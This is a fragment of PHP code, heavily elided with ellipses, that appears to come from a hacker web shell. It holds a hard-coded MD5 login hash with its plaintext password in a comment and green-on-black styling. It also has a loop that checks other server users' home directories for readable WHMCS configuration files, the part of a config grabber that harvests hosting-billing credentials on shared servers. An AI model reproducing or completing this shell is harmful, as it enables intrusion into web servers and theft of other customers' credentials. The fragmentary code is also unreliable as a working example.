...
/* Configurasi */
$auth_pass 			= "b361a18ed545887811e4caa8ae640db2";// mlbb@11
$color 				= "#00ff00";
...
.html(filenames.join(","));
		...
		<style>
			...
			@import url(http://fonts.googleapis.com/css?family=Quicksand);body{margin:0;padding:0;font-family:"Lato";}
				...
				foreach($user_config[1] as $user_con) {
					...
					if(is_readable($user_config_dir)) {
						...
						[
							...
							"/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS","/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
